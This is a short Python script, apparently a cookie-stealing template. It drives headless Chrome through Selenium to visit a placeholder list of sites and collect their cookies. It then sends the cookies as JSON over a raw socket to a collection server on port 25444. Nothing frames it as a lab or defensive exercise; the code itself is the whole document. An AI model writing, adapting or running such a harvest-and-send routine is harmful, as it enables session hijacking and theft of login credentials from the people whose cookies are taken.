from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import socket
import json

def get_chrome_cookies():
    cookies = {}
    
    try:
        #Chrome Options
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument("--disable-site-isolation-trials")
        
        #Create Chrome driver
        driver = webdriver.Chrome(options=chrome_options)
        
        #Visit sites
        sites = [
            #SITES
            'http://127.0.0.1:5000'
        ]
        
        for site in sites:
            try:
                driver.get(site)
                time.sleep(10)
                #Get cookies
                site_cookies = driver.get_cookies()
                for cookie in site_cookies:
                     cookies[cookie['name']] = cookie['value']
            except Exception as e:
                continue
    except Exception as e:
            return None

    finally:
        try:
            driver.quit()
        except:
            pass
    return cookies

def send_to_srv(cookies):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('localhost', 25444))
    client.sendall(json.dumps(cookies).encode('utf-8'))
    response = client.recv(1024)
    try:
        print(response.decode())
    except:
        print("No response")
    client.close()
   
if __name__ == '__main__':
    cookies = get_chrome_cookies()
    if cookies:
        send_to_srv(cookies)
    else:
        print("No cookies to send")